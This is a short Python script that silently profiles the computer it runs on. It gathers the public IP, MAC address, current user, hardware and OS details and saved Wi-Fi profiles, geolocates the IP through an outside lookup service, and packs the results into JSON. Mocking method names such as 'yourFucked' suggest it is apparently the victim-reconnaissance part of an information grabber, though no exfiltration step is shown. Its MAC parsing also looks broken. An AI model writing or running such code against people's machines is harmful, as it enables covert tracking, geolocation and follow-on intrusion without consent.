import json, subprocess, urllib.request, time, platform, multiprocessing

class PC_info:
    def __init__(self):
        self.data = {}

    def get_public_ip(self):
        self.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
        self.data['ip']=self.external_ip

    def getMAC(self):
        out = subprocess.Popen("ipconfig /all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(.5)
        stdout,stderr = out.communicate()# gets output and errors
        for x in stdout.decode().split('\\n'):#loops through each line of the decoded output
            if "Physical Address" in x:
                self.data['mac']=x
            pass

    def currentUser(self):
        out = subprocess.Popen(['whoami'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(.5)
        stdout,stderr = out.communicate()
        CURRENT_user = str(stdout.decode()).strip()
        self.data['current user']=CURRENT_user

    def systemInfo(self):
        self.data["Computer network name"]=platform.node()
        self.data["Machine type"]=platform.machine()
        self.data["Processor type"]=platform.processor()
        self.data["Platform type"]=platform.platform()
        self.data["Operating system"]=platform.system()
        self.data["Operating system release"]=platform.release()
        self.data["Operating system version"]=platform.version()
        self.data["Number of Cores"]=multiprocessing.cpu_count()

    def yourFucked(self):
        tracked = 'https://ipwhois.app/json/'+self.data['ip']
        self.ip_info = urllib.request.urlopen(tracked).read().decode('utf8')
        parsed = json.loads(self.ip_info)
        for data in parsed:
            self.data[data]=parsed[data]


    def getWlanInfo(self):
        out = subprocess.Popen("netsh wlan show profiles", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(.5)
        stdout,stderr = out.communicate()# gets output and errors
        self.data['Wlan Info'] = stdout.decode()

    def serializeMeSon(self):
        self.get_public_ip()
        self.getMAC()
        self.currentUser()
        self.systemInfo()
        self.getWlanInfo()
        self.yourFucked()
        return str(json.dumps(self.data, indent = 4))

fu = PC_info()
data = fu.serializeMeSon()
